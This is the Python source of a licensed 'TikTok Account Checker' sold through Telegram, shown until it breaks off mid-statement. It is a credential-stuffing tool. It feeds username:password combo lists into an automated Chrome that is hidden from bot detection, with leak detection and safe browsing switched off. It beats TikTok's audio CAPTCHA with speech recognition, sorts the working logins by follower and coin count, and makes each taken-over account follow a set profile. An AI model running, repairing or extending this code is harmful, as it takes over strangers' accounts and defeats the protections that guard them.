import os
import re
import time
import random
import requests
import tempfile
import uuid
import socket
import getpass
from datetime import datetime, timedelta
from pydub import AudioSegment
import speech_recognition as sr
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import undetected_chromedriver as uc
import platform
from collections import defaultdict
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.style import Style
from rich.box import ROUNDED

console = Console()

class LicenseValidator:
    def __init__(self):
        self.license_api = "https://key-system-4qax.onrender.com/api/validate"
        self.last_validation = None
        self.license_data = None
        self.valid_until = None
        self.retry_delay = 5  # seconds between retries
        self.max_retries = 3  # maximum retry attempts
        self.session_token = str(uuid.uuid4())  # Unique session identifier
        
    def get_device_info(self):
        """Get HWID and IP address of the current device"""
        try:
            # Get HWID (Windows/Linux/Mac compatible)
            hwid = str(uuid.getnode())
            
            # Get local IP (not 127.0.0.1)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Google DNS
            ip = s.getsockname()[0]
            s.close()
            
            return {
                "hwid": hwid,
                "ip": ip,
                "username": getpass.getuser(),
                "session_token": self.session_token
            }
        except Exception as e:
            return {
                "hwid": "UNKNOWN_HWID",
                "ip": "0.0.0.0",
                "username": "UNKNOWN_USER",
                "session_token": self.session_token
            }
    
    def validate_license(self, license_key):
        """Validate a license key with the API"""
        device_info = self.get_device_info()
        
        payload = {
            "key": license_key,
            "hwid": device_info["hwid"],
            "session_token": device_info["session_token"],
            "is_revalidation": self.last_validation is not None
        }
        
        headers = {
            "User-Agent": "TikTokChecker/1.0",
            "X-Device-Username": device_info["username"],
            "X-Retry-Bypass": "true"
        }
        
        for attempt in range(self.max_retries):
            try:
                response = requests.post(
                    self.license_api,
                    json=payload,
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if data.get("success"):
                        self.license_data = data.get("data", {})
                        self.last_validation = datetime.now()
                        
                        # Handle expiration time
                        expires_at = self.license_data.get('expires_at')
                        if expires_at:
                            try:
                                self.valid_until = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
                            except (ValueError, TypeError):
                                self.valid_until = datetime.now() + timedelta(hours=24)
                        else:
                            self.valid_until = datetime.now() + timedelta(hours=24)
                        
                        return True
                    else:
                        error_msg = data.get('message', 'Unknown error')
                        
                        if "usage limit" in error_msg.lower() and "same hwid" in error_msg.lower():
                            time.sleep(10)
                            continue
                            
                        console.print(f"\nâ [red]License Error: {error_msg}[/red]")
                        return False
                        
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', self.retry_delay))
                    time.sleep(retry_after)
                    continue
                    
                else:
                    error_msg = f"API Error (HTTP {response.status_code})"
                    if response.text:
                        error_msg += f": {response.text}"
                    console.print(f"\nâ ï¸ [yellow]{error_msg}[/yellow]")
                    return False
                    
            except requests.exceptions.RequestException as e:
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)
                    continue
                console.print(f"\nâ ï¸ [yellow]Connection Error: {str(e)}[/yellow]")
                return False
        
        return False
    
    def is_license_valid(self):
        """Check if license is still valid (for periodic checks)"""
        if not self.license_data or not self.valid_until:
            return False
            
        if datetime.now() > self.valid_until:
            return False
            
        return True
    
    def get_license_info(self):
        """Get formatted license information"""
        if not self.license_data:
            return "No active license"
            
        info = f"ð Key: {self.license_data.get('key', 'N/A')}\n"
        info += f"ð¥ï¸ HWID: {self.get_device_info()['hwid']}\n"
        info += f"ð IP: {self.get_device_info()['ip']}\n"
        info += f"ð¤ User: {self.get_device_info()['username']}\n"
        
        expires_at = self.license_data.get('expires_at')
        if expires_at:
            info += f"ð Expires: {expires_at}\n"
        else:
            info += "ð Expires: Never\n"
            
        uses_remaining = self.license_data.get('uses_remaining')
        if uses_remaining is not None:
            info += f"ð Uses Left: {uses_remaining}"
        else:
            info += "ð Uses Left: Unlimited"
        
        return info

class TikTokChecker:
    def __init__(self):
        self.start_time = time.time()
        self.license = LicenseValidator()
        self.stats = {
            'total': 0,
            'checked': 0,
            'hits': 0,
            'bads': 0,
            'flagged': 0,
            'locked': 0,
            'raped': 0,
            '2fa': 0,
            'errors': 0,
            'captcha_success': 0,
            'captcha_failed': 0,
            'followers': defaultdict(int),
            'coins': defaultdict(int),
            'suspended': 0,
            'last_status': "Initializing..."
        }
        self.headless = False
        self.captcha_retries = 5
        self.current_combo = ""
        self.create_results_folders()
        self.clear_terminal()
        self.print_banner()
        self.live = None
        
    def create_results_folders(self):
        folders = ['Results', 'Results/Hits', 'Results/Followers', 'Results/Coins', 
                  'Results/2fa', 'Results/Raped', 'Results/Flagged', 'Results/Locked',
                  'Results/CaptchaFails', 'Results/Suspended']
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder)

    def clear_terminal(self):
        os.system('cls' if platform.system() == "Windows" else 'clear')

    def print_banner(self):
        banner = r"""
$$$$$$$$\ $$\ $$\         $$\               $$\              $$$$$$\  $$\                           $$\                           
\__$$  __|\__|$$ |        $$ |              $$ |            $$  __$$\ $$ |                          $$ |                          
   $$ |   $$\ $$ |  $$\ $$$$$$\    $$$$$$\  $$ |  $$\       $$ /  \__|$$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\  
   $$ |   $$ |$$ | $$  |\_$$  _|  $$  __$$\ $$ | $$  |      $$ |      $$  __$$\ $$  __$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$\ 
   $$ |   $$ |$$$$$$  /   $$ |    $$ /  $$ |$$$$$$  /       $$ |      $$ |  $$ |$$$$$$$$ |$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|
   $$ |   $$ |$$  _$$<    $$ |$$\ $$ |  $$ |$$  _$$<        $$ |  $$\ $$ |  $$ |$$   ____|$$ |      $$  _$$<  $$   ____|$$ |      
   $$ |   $$ |$$ | \$$\   \$$$$  |\$$$$$$  |$$ | \$$\       \$$$$$$  |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |      
   \__|   \__|\__|  \__|   \____/  \______/ \__|  \__|       \______/ \__|  \__| \_______| \_______|\__|  \__| \_______|\__|      
"""
        console.print(f"[bold cyan]{banner}[/bold cyan]")
        console.print(f"[bold purple]Made By 8h3 | Telegram: @eight8eigj | Channel: https://t.me/eight8cloud[/bold purple]\n")

    def create_stats_panel(self):
        elapsed = time.time() - self.start_time
        hours, rem = divmod(elapsed, 3600)
        minutes, seconds = divmod(rem, 60)
        elapsed_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        captcha_success_rate = 0
        if (self.stats['captcha_success'] + self.stats['captcha_failed']) > 0:
            captcha_success_rate = (self.stats['captcha_success'] / 
                                  (self.stats['captcha_success'] + self.stats['captcha_failed'])) * 100
        
        main_table = Table.grid(padding=(0, 2))
        main_table.add_column(style="bold cyan")
        main_table.add_column(style="bold white")
        
        main_table.add_row("Total:", f"{self.stats['total']}")
        main_table.add_row("Checked:", f"{self.stats['checked']}")
        main_table.add_row("Hits:", f"[bold green]{self.stats['hits']}[/bold green]")
        main_table.add_row("2FA:", f"[bold blue]{self.stats['2fa']}[/bold blue]")
        main_table.add_row("Flagged:", f"[bold yellow]{self.stats['flagged']}[/bold yellow]")
        main_table.add_row("Locked:", f"[bold magenta]{self.stats['locked']}[/bold magenta]")
        main_table.add_row("Raped:", f"[bold red]{self.stats['raped']}[/bold red]")
        main_table.add_row("Suspended:", f"[bold red]{self.stats['suspended']}[/bold red]")
        main_table.add_row("Bads:", f"[bold red]{self.stats['bads']}[/bold red]")
        main_table.add_row("Errors:", f"[bold red]{self.stats['errors']}[/bold red]")
        main_table.add_row("Elapsed:", elapsed_str)

        captcha_table = Table.grid(padding=(0, 2))
        captcha_table.add_column(style="bold cyan")
        captcha_table.add_column(style="bold white")
        
        captcha_table.add_row("Success:", f"[bold green]{self.stats['captcha_success']}[/bold green]")
        captcha_table.add_row("Failed:", f"[bold red]{self.stats['captcha_failed']}[/bold red]")
        captcha_table.add_row("Retries:", f"{self.captcha_retries}")
        captcha_table.add_row("Success Rate:", f"[bold {'green' if captcha_success_rate >= 50 else 'yellow' if captcha_success_rate >= 30 else 'red'}]{captcha_success_rate:.1f}%[/]")

        stats_table = Table(title="Account Stats", box=ROUNDED, border_style="blue")
        stats_table.add_column("Category", style="bold cyan", justify="center")
        stats_table.add_column("Followers", style="bold cyan", justify="center")
        stats_table.add_column("Coins", style="bold cyan", justify="center")
        
        for category in ['0-99', '100-999', '1K-9K', '10K-99K', '100K-999K', '1M+']:
            stats_table.add_row(
                f"[bold white]{category}[/bold white]",
                f"[bold white]{self.stats['followers'][category]}[/bold white]",
                f"[bold white]{self.stats['coins'][category]}[/bold white]"
            )

        status_panel = Panel(
            Text(f"{self.current_combo}\n{self.stats['last_status']}", justify="center"),
            title="Current Status",
            border_style="green" if "success" in self.stats['last_status'].lower() else 
                        "blue" if "2fa" in self.stats['last_status'].lower() else
                        "red" if "fail" in self.stats['last_status'].lower() or "error" in self.stats['last_status'].lower() or "raped" in self.stats['last_status'].lower() else 
                        "magenta" if "locked" in self.stats['last_status'].lower() else "yellow",
            style="bold"
        )

        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="upper", size=10),
            Layout(name="lower")
        )
        
        layout["header"].update(
            Panel("TikTok Account Checker By 8h3", style="bold blue")
        )
        
        layout["upper"].split_row(
            Layout(Panel(main_table, title="Checker Stats", border_style="blue")), 
            Layout(Panel(captcha_table, title="Captcha Stats", border_style="blue"))
        )
        
        layout["lower"].split_row(
            Layout(Panel(stats_table, border_style="blue"), name="stats"),
            Layout(status_panel, name="status", ratio=2)
        )

        return layout

    def update_display(self):
        if self.live:
            self.live.update(self.create_stats_panel())

    def categorize_count(self, count):
        try:
            num = int(count.replace(',', ''))
            if num == 0:
                return "0-99"
            elif 1 <= num <= 99:
                return "0-99"
            elif 100 <= num <= 999:
                return "100-999"
            elif 1000 <= num <= 9999:
                return "1K-9K"
            elif 10000 <= num <= 99999:
                return "10K-99K"
            elif 100000 <= num <= 999999:
                return "100K-999K"
            else:
                return "1M+"
        except:
            return "0-99"

    def save_result(self, combo, status, profile_info=None):
        filename = {
            'valid': 'Results/Hits/all.txt',
            'invalid': 'Results/bads.txt',
            'flagged': 'Results/Flagged/flagged.txt',
            'locked': 'Results/Locked/locked.txt',
            'raped': 'Results/Raped/raped.txt',
            '2fa': 'Results/2fa/2fa.txt',
            'error': 'Results/error.txt',
            'captcha_fail': 'Results/CaptchaFails/captcha_fails.txt',
            'suspended': 'Results/Suspended/suspended.txt'
        }.get(status, 'Results/unknown.txt')
        
        with open(filename, 'a', encoding='utf-8') as f:
            if status == 'valid' and profile_info:
                line = f"{combo}|Followers: {profile_info['followers']} Following: {profile_info['following']} Likes: {profile_info['likes']}| Coins: {profile_info['coins']} | Checker By 8h3 (@eight8eigj https://t.me/eight8cloud)\n"
                f.write(line)
                
                followers_cat = self.categorize_count(profile_info['followers'])
                coins_cat = self.categorize_count(profile_info['coins'])
                
                with open(f"Results/Followers/followers_{followers_cat}.txt", 'a', encoding='utf-8') as ff:
                    ff.write(line)
                with open(f"Results/Coins/coins_{coins_cat}.txt", 'a', encoding='utf-8') as fc:
                    fc.write(line)
            else:
                line = f"{combo} | Status: {status.upper()} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f.write(line)

    def clean_combos_file(self):
        valid_combos = set()
        phone_combos = set()
        
        if not os.path.exists('combos.txt'):
            console.print("[red]combos.txt not found. Please create the file with your credentials.[/red]")
            return [], []
        
        with open('combos.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                
                parts = line.split(':', 1)
                if len(parts) != 2:
                    continue
                
                username, password = parts
                
                if re.match(r'^\+?\d{8,15}$', username.strip()):
                    phone_combos.add(f"{username}:{password}")
                else:
                    valid_combos.add(f"{username}:{password}")
        
        with open('combos.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_combos) + '\n')
        
        if phone_combos:
            with open('phonenumbercombos.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(phone_combos) + '\n')
        
        return list(valid_combos), list(phone_combos)

    def initialize_driver(self):
        options = uc.ChromeOptions()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--start-maximized")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-popup-blocking")
        options.add_argument("--disable-notifications")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--no-sandbox")
        
        options.add_argument("--password-store=basic")
        options.add_argument("--disable-features=PasswordLeakDetection")
        options.add_argument("--disable-component-update")
        options.add_experimental_option("prefs", {
            "profile.password_manager_leak_detection": False,
            "safebrowsing.enabled": False
        })
        
        if self.headless:
            options.add_argument("--headless=new")
        
        driver = uc.Chrome(
            options=options,
            service=Service(ChromeDriverManager().install()),
            use_subprocess=True
        )
        
        if not self.headless:
            driver.maximize_window()
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        
        return driver

    def check_flagged(self, driver):
        try:
            h1 = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'h1.email-view-wrapper__title.H1-Bold.text-color-TextPrimary'))
            )
            if "Suspicious activity detected" in h1.text:
                self.stats['last_status'] = "Account Flagged"
                self.update_display()
                return True
        except TimeoutException:
            return False
        return False

    def check_locked(self, driver):
        try:
            if "login/download-app" in driver.current_url:
                self.stats['last_status'] = "Account Locked"
                self.update_display()
                return True
        except:
            pass
        return False

    def check_raped(self, driver):
        try:
            span = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'span[role="status"]'))
            )
            if "Maximum number of attempts reached" in span.text:
                self.stats['last_status'] = "Account Raped"
                self.update_display()
                return True
        except TimeoutException:
            return False
        return False

    def check_suspended(self, driver):
        try:
            span = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'span[role="status"]'))
            )
            if "Your account is currently suspended" in span.text:
                self.stats['last_status'] = "Account Suspended"
                self.update_display()
                return True
        except TimeoutException:
            return False
        return False

    def check_invalid_login(self, driver):
        try:
            span = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'span[role="status"]'))
            )
            if "Account doesn't exist" in span.text:
                self.stats['last_status'] = "Account Doesn't Exist"
                self.update_display()
                return "unregistered"
            if "Incorrect account or password" in span.text or "Username or password doesn't match our records" in span.text:
                self.stats['last_status'] = "Invalid Credentials"
                self.update_display()
                return "invalid"
            if "Maximum number of attempts reached" in span.text:
                return "raped"
            if "Your account is currently suspended" in span.text:
                return "suspended"
        except TimeoutException:
            return False
        return False

    def check_2fa(self, driver):
        try:
            if "/login/2sv/totp" in driver.current_url or "/login/2sv/phone" in driver.current_url:
                self.stats['last_status'] = "2FA Required"
                self.update_display()
                return True
        except:
            pass
        return False

    def captcha_failed_after_solve(self, driver):
        try:
            span = WebDriverWait(driver, 2).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'span[role="status"]'))
            )
            if "Username or password doesn't match our records" in span.text:
                self.stats['last_status'] = "Invalid Credentials After Captcha"
                self.update_display()
                return "invalid"
            if "Your account is currently suspended" in span.text:
                self.stats['last_status'] = "Account Suspended After Captcha"
                self.update_display()
                return "suspended"
            if "color: var(--ui-text-danger)" in span.get_attribute("style"):
                self.stats['last_status'] = "Captcha Failed"
                self.update_display()
                return True
        except TimeoutException:
            pass
            
        return False

    def solve_audio_captcha(self, driver, combo, attempt):
        try:
            self.stats['last_status'] = f"Solving CAPTCHA (Attempt {attempt})"
            self.update_display()
            
            if attempt == 1:
                try:
                    audio_button = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.ID, "captcha_switch_button")))
                    driver.execute_script("arguments[0].click();", audio_button)
                    time.sleep(1)
                except:
                    self.stats['last_status'] = "Failed to switch to audio captcha"
                    self.update_display()
                    return False

            if attempt > 1:
                time.sleep(1.5)
            
            try:
                audio_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "audio[src]"))
                )
                audio_src = audio_element.get_attribute("src")
            except:
                self.stats['last_status'] = "Audio element not found"
                self.update_display()
                return False
                
            if not audio_src:
                self.stats['last_status'] = "No audio source found"
                self.update_display()
                return False

            max_retries = 2
            audio_response = None
            for _ in range(max_retries):
                try:
                    audio_response = requests.get(audio_src, timeout=10)
                    if audio_response.status_code == 200:
                        break
                except Exception as e:
                    self.stats['last_status'] = f"Audio download failed, retrying... ({str(e)})"
                    self.update_display()
                    time.sleep(0.5)
            
            if not audio_response or audio_response.status_code != 200:
                self.stats['last_status'] = "Failed to download audio"
                self.update_display()
                return False

            with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as mp3_file:
                mp3_file.write(audio_response.content)
                mp3_path = mp3_file.name

            wav_path = mp3_path.replace(".mp3", ".wav")
            
            try:
                audio = AudioSegment.from_mp3(mp3_path)
                audio = audio + 10
                audio.export(wav_path, format="wav")
            except Exception as e:
                self.stats['last_status'] = f"Audio conversion failed: {str(e)}"
                self.update_display()
                os.remove(mp3_path)
                return False

            recognizer = sr.Recognizer()
            with sr.AudioFile(wav_path) as source:
                audio_data = recognizer.record(source)
            
            text = ""
            engines = ["google", "sphinx"]
            
            for engine in engines:
                try:
                    if engine == "google":
                        text = recognizer.recognize_google(audio_data)
                    elif engine == "sphinx":
                        text = recognizer.recognize_sphinx(audio_data)
                    break
                except sr.UnknownValueError:
                    self.stats['last_status'] = f"{engine} could not understand audio"
                    self.update_display()
                    continue
                except sr.RequestError as e:
                    self.stats['last_status'] = f"{engine} error; {str(e)}"
                    self.update_display()
                    continue

            if not text:
                self.stats['last_status'] = "Generating random code (audio failed)"
                self.update_display()
                code = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=5))
            else:
                code = re.sub(r'[^a-zA-Z0-9]', '', text).lower()
                if len(code) != 5:
                    code = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=5))
                    self.stats['last_status'] = "Generated random code (invalid length)"
                    self.update_display()

            self.stats['last_status'] = f"Entering code: {code}"
            self.update_display()

            try:
                captcha_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, 'input.TUXTextInputCore-input'))
                )
                captcha_input.clear()
                captcha_input.send_keys(code)
                
                verify_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//button[.//div[text()="Verify"]]'))
                )
                verify_button.click()
                
                time.sleep(2)
                
                captcha_result = self.captcha_failed_after_solve(driver)
                if captcha_result == "invalid":
                    return "invalid"
                elif captcha_result == "suspended":
                    return "suspended"
                
                if self.check_2fa(driver):
                    return "2fa"
                
                if self.check_raped(driver):
                    return "raped"
                
                if self.check_suspended(driver):
                    return "suspended"
                
                try:
                    WebDriverWait(driver, 2).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'span.cap-flex.cap-items-center'))
                    )
                    self.stats['last_status'] = "Captcha still present after verification"
                    self.update_display()
                    return False
                except TimeoutException:
                    self.stats['last_status'] = "Captcha solved successfully"
                    self.update_display()
                    return True
                    
            except Exception as e:
                self.stats['last_status'] = f"Error entering captcha: {str(e)}"
                self.update_display()
                return False
            finally:
                try:
                    os.remove(mp3_path)
                    os.remove(wav_path)
                except:
                    pass

        except Exception as e:
            self.stats['last_status'] = f"Error in captcha solving: {str(e)}"
            self.update_display()
            return False

    def handle_password_change_prompt(self, driver):
        try:
            prompt = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'div[data-e2e="change-password-modal"]'))
            )
            
            try:
                not_now = prompt.find_element(By.CSS_SELECTOR, 'button[data-e2e="change-password-not-now"]')
                not_now.click()
                time.sleep(0.5)
                return True
            except:
                pass
            
            driver.find_element(By.TAG_NAME, 'body').click()
            time.sleep(0.5)
            return True
            
        except TimeoutException:
            return False

    def get_profile_info(self, driver):
        try:
            self.stats['last_status'] = "Getting profile info"
            self.update_display()
            
            self.handle_password_change_prompt(driver)
            
            driver.get("https://www.tiktok.com/profile")
            time.sleep(1.5)
            
            username = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'h1[data-e2e="user-title"]'))
            ).text
            
            stats = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'h3[class*="CountInfos"]'))
            )
            
            following = stats.find_element(By.CSS_SELECTOR, 'strong[data-e2e="following-count"]').text
            followers = stats.find_element(By.CSS_SELECTOR, 'strong[data-e2e="followers-count"]').text
            likes = stats.find_element(By.CSS_SELECTOR, 'strong[data-e2e="likes-count"]').text
            
            driver.get("https://www.tiktok.com/coin")
            time.sleep(1.5)
            
            coin_balance = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'span[data-e2e="wallet-coins-balance"]'))
            ).text
            
            driver.get("https://www.tiktok.com/@jaydenlikesmaidens?lang=en")
            time.sleep(1.5)
            
            try:
                follow_button = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-e2e="follow-button"]'))
                )
                follow_button.click()
                time.sleep(0.5)
                follow_works = True
            except:
                follow_works = False
            
            self.stats['last_status'] = "Successfully gathered profile info"
            self.update_display()
            return {
                "username": username,
                "following": following,
                "followers": followers,
                "likes": likes,
                "coins": coin_balance,
                "follow_works": follow_works
            }
        
        except Exception as e:
            self.stats['last_status'] = f"Error getting profile info: {str(e)}"
            self.update_display()
            return None

    def attempt_login(self, driver, username, password):
        try:
            self.current_combo = f"{username}:{password}"
            self.stats['last_status'] = "Attempting login"
            self.update_display()
            
            driver.get("https://www.tiktok.com/login/phone-or-email/email")
            time.sleep(0.5)
            
            username_field = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="username"], input[type="text"][placeholder*="Email or username"]'))
            )
            password_field = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]'))
            )
            
            username_field.clear()
            username_field.send_keys(username)
            
            password_field.clear()
            password_field.send_keys(password)
            
            login_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-e2e="login-button"], button[type="submit"]'))
            )
            login_button.click()
            time.sleep(1.5)
            
            if self.check_suspended(driver):
                return "suspended"
            
            if self.check_locked(driver):
                return "locked"
            
            if self.check_flagged(driver):
                return "flagged"
            
            if self.check_raped(driver):
                return "raped"
            
            if self.check_2fa(driver):
                return "2fa"
            
            invalid_status = self.check_invalid_login(driver)
            if invalid_status == "unregistered":
                return "invalid"
            elif invalid_status == "invalid":
                return "invalid"
            elif invalid_status == "raped":
                return "raped"
            elif invalid_status == "suspended":
                return "suspended"
            
            if "/foryou" in driver.current_url or "/login/redirect" in driver.current_url:
                return "valid"
            
            try:
                WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, '.captcha-verify-container, [id*="captcha"], .secsdk-captcha-drag-icon'))
                )
                return "captcha"
            except TimeoutException:
                pass
            
            return "invalid"
                
        except Exception:
            self.stats['last_status'] = "Login attempt error"
            self.update_display()
            return "error"

    def get_captcha_retries(self):
        while True:
            try:
                retries = input("Enter number of captcha retries (0 for infinite): ")
                retries = int(retries)
                if retries >= 0:
                    return retries if retries != 0 else float('inf')
                console.print("Please enter a number 0 or higher")
            except ValueError:
                console.print("Please enter a valid number")

    def ask_headless(self):
        while True:
            response = input("Run in headless mode? (y/n): ").lower()
            if response in ['y', 'n']:
                return response == 'y'
            console.print("Please enter 'y' or 'n'")

    def main(self):
        # Show banner first
        self.clear_terminal()
        self.print_banner()
        
        # License validation with retry logic
        validation_success = False
        for attempt in range(3):
            license_key = input("Enter your license key: ").strip()
            if not license_key:
                console.print("[red]Please enter a valid license key[/red]")
                continue
                
            if self.license.validate_license(license_key):
                validation_success = True
                break
            else:
                console.print("[red]Invalid license key. Please try again or contact support.[/red]")
        
        if not validation_success:
            console.print("[red]Maximum license validation attempts reached. Exiting.[/red]")
            return
    
        # Show license info
        console.print("\n[bold green]â License Validated![/bold green]")
        console.print(Panel(self.license.get_license_info(), title="License Information", border_style="green"))
        input("\nPress Enter to start checking...")
        
        # Initialize checking
        valid_combos, _ = self.clean_combos_file()
        self.stats['total'] = len(valid_combos)
        
        if self.stats['total'] == 0:
            console.print("[red]No valid combos found, exiting.[/red]")
            return
        
        self.captcha_retries = self.get_captcha_retries()
        self.headless = self.ask_headless()
        self.clear_terminal()
        self.print_banner()
        
        self.live = Live(self.create_stats_panel(), refresh_per_second=4, screen=True)
        self.live.__enter__()
        
        driver = None
        last_license_check = time.time()
        
        try:
            driver = self.initialize_driver()
            
            for combo in valid_combos:
                # Periodic license check (every 30 minutes)
                if time.time() - last_license_check > 1800:
                    if not self.license.validate_license(self.license.license_data.get('key')):
                        console.print("\n[red]License validation failed. Shutting down...[/red]")
                        self.stats['last_status'] = "[red]License Invalid[/red]"
                        self.update_display()
                        break
                    last_license_check = time.time()
                
                self.stats['checked'] += 1
                username, password = combo.split(':', 1)
                
                status = self.attempt_login(driver, username, password)
                profile_info = None
                
                if status == "captcha":
                    attempt = 1
                    while True:
                        if attempt > self.captcha_retries:
                            self.save_result(combo, "captcha_fail")
                            self.stats['last_status'] = "[yellow]Max captcha retries reached - Saved[/yellow]"
                            self.update_display()
                            break
                            
                        solved = self.solve_audio_captcha(driver, combo, attempt)
                        
                        if solved == "2fa":
                            status = "2fa"
                            break
                        elif solved == "raped":
                            status = "raped"
                            break
                        elif solved == "suspended":
                            status = "suspended"
                            break
                        elif solved == "invalid":
                            status = "invalid"
                            break
                        elif solved:
                            self.stats['captcha_success'] += 1
                            self.update_display()
                            
                            if self.check_locked(driver):
                                status = "locked"
                                break
                            
                            if self.check_flagged(driver):
                                status = "flagged"
                                break
                            
                            if self.check_2fa(driver):
                                status = "2fa"
                                break
                                
                            if "/foryou" in driver.current_url or "/login/redirect" in driver.current_url:
                                profile_info = self.get_profile_info(driver)
                                if profile_info:
                                    status = "valid"
                                    break
                                else:
                                    status = "error"
                                    break
                            else:
                                attempt += 1
                                continue
                        else:
                            self.stats['captcha_failed'] += 1
                            self.update_display()
                            attempt += 1
                            continue
                
                if status == "valid":
                    self.stats['hits'] += 1
                    self.stats['last_status'] = "[green]Valid Account[/green]"
                    if profile_info:
                        followers_cat = self.categorize_count(profile_info['followers'])
                        coins_cat = self.categorize_count(profile_info['coins'])
                        
                        self.stats['followers'][followers_cat] += 1
                        self.stats['coins'][coins_cat] += 1
                elif status == "2fa":
                    self.stats['2fa'] += 1
                    self.stats['last_status'] = "[blue]2FA Required[/blue]"
                elif status == "invalid":
                    self.stats['bads'] += 1
                    self.stats['last_status'] = "[red]Invalid Account[/red]"
                elif status == "flagged":
                    self.stats['flagged'] += 1
                    self.stats['last_status'] = "[yellow]Flagged Account[/yellow]"
                elif status == "locked":
                    self.stats['locked'] += 1
                    self.stats['last_status'] = "[magenta]Locked Account[/magenta]"
                elif status == "raped":
                    self.stats['raped'] += 1
                    self.stats['last_status'] = "[red]Account Raped[/red]"
                elif status == "suspended":
                    self.stats['suspended'] += 1
                    self.stats['last_status'] = "[red]Account Suspended[/red]"
                elif status == "error":
                    self.stats['errors'] += 1
                    self.stats['last_status'] = "[red]Error Occurred[/red]"
                
                if status != "captcha":
                    self.save_result(combo, status, profile_info)
                self.update_display()
                
                if combo != valid_combos[-1]:
                    driver.delete_all_cookies()
                    time.sleep(0.5)
            
        except KeyboardInterrupt:
            console.print("\n[red]Keyboard interrupt detected. Shutting down...[/red]")
            self.stats['last_status'] = "[red]Stopped by user[/red]"
            self.update_display()
        except Exception as e:
            console.print(f"[red]Fatal error: {str(e)}[/red]")
            self.stats['last_status'] = f"[red]Fatal Error: {str(e)}[/red]"
            self.update_display()
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass
            
            captcha_success_rate = 0
            if (self.stats['captcha_success'] + self.stats['captcha_failed']) > 0:
                captcha_success_rate = (self.stats['captcha_success'] / 
                                      (self.stats['captcha_success'] + self.stats['captcha_failed'])) * 100
            
            if self.live:
                self.live.__exit__(None, None, None)
                
            final_panel = Panel(
                f"[bold green]Checking Complete![/bold green]\n\n"
                f"Total Combos Checked: [bold]{self.stats['checked']}[/bold]\n"
                f"Valid Accounts: [bold green]{self.stats['hits']}[/bold green]\n"
                f"2FA Accounts: [bold blue]{self.stats['2fa']}[/bold blue]\n"
                f"Flagged Accounts: [bold yellow]{self.stats['flagged']}[/bold yellow]\n"
                f"Locked Accounts: [bold magenta]{self.stats['locked']}[/bold magenta]\n"
                f"Suspended Accounts: [bold red]{self.stats['suspended']}[/bold red]\n"
                f"Invalid Accounts: [bold red]{self.stats['bads']}[/bold red]\n\n"
                f"Captcha Success Rate: [bold {'green' if captcha_success_rate >= 50 else 'yellow' if captcha_success_rate >= 30 else 'red'}]{captcha_success_rate:.1f}%[/]\n\n"
                f"License Status: [bold {'green' if self.license.is_license_valid() else 'red'}]{'Valid' if self.license.is_license_valid() else 'Invalid'}[/]\n"
